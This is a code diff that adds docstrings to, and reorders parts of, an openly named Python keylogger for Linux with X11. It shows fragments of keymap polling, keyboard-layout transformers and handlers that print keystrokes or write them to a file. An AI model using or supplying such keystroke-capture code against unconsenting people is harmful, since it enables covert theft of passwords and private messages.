@@ -1,5 +1,15 @@
 #!/usr/bin/env python3
 
+"""
+Kl is a simple keylogger for Linux + X11.
+
+Requires Python 3 and xlib.
+
+Homepage and documentation: https://github.com/surrealists/kl
+
+License: MIT (see LICENSE for details)
+"""
+
 import ctypes
 from ctypes.util import find_library
 from time import sleep
@@ -19,27 +29,12 @@ __all__ = [
 ]
 
 
-# =================
-# Utility functions
-# =================
-
-def _parse_args():
-    import argparse
-    parser = argparse.ArgumentParser(description='Keylogger for Linux + X11')
-    arg = parser.add_argument
-    arg('-s', '--sleep-time', type=float)
-    arg('-t', '--transform', choices=['spanish', 'english_usa', 'pt_br'])
-    arg('-f', '--file')
-    arg('-l', '--line-buffering', action='store_true')
-    args = parser.parse_args()
-    return args
-
-
 # ============
 # Transformers
 # ============
 
 class BaseTransformer:
+    """Base for Transformer classes."""
     def __init__(self):
         self._digits = '0123456789'
         self._letters = 'abcdefghijklmnopqrstuvwxyz'
@@ -89,6 +84,7 @@ class BaseTransformer:
 
 
 class SpanishTransformer(BaseTransformer):
+    """Transformer for Spanish keyboard layout"""
     def __init__(self):
         super().__init__()
 
@@ -187,6 +183,7 @@ class SpanishTransformer(BaseTransformer):
 
 
 class PtBrTransformer(BaseTransformer):
+    """Transformer for Portuguese (Brazil) keyboard layout."""
     def __init__(self):
         super().__init__()
 
@@ -286,6 +283,7 @@ class PtBrTransformer(BaseTransformer):
 
 
 class EnglishUsaTransformer(BaseTransformer):
+    """Transformer for English (USA) keyboard layout."""
     def __init__(self):
         super().__init__()
 
@@ -355,11 +353,13 @@ class EnglishUsaTransformer(BaseTransformer):
 # ========
 
 class PrintHandler:
+    """Handler that uses the print function."""
     def handle(self, value):
         print(value)
 
 
 class FileHandler:
+    """Handler that writes in a file."""
     def __init__(self, stream):
         self._stream = stream
 
@@ -372,6 +372,10 @@ class FileHandler:
 # ============
 
 class Keymap:
+    """
+    Keymap encapsulates the communication with the X11 library, and the
+    transformation of the data structures obtained.
+    """
     def __init__(self):
         self._x11 = ctypes.cdll.LoadLibrary(find_library("X11"))
         self._display = self._x11.XOpenDisplay(None)
@@ -557,6 +561,9 @@ class Keymap:
 
 
 class Kl:
+    """
+    Kl contains the instances needed to run the main loop of the keylogger.
+    """
     def __init__(self, sleep_time=.02, transformer=None,
                  handler=PrintHandler()):
         self._sleep_time = sleep_time
@@ -587,6 +594,23 @@ class Kl:
             self._last_keys = keys
 
             sleep(self._sleep_time)
+
+
+# =================
+# Utility functions
+# =================
+
+def _parse_args():
+    """Parse command line arguments."""
+    import argparse
+    parser = argparse.ArgumentParser(description='Keylogger for Linux + X11')
+    arg = parser.add_argument
+    arg('-s', '--sleep-time', type=float)
+    arg('-t', '--transform', choices=['spanish', 'english_usa', 'pt_br'])
+    arg('-f', '--file')
+    arg('-l', '--line-buffering', action='store_true')
+    args = parser.parse_args()
+    return args
 
 
 if __name__ == '__main__':
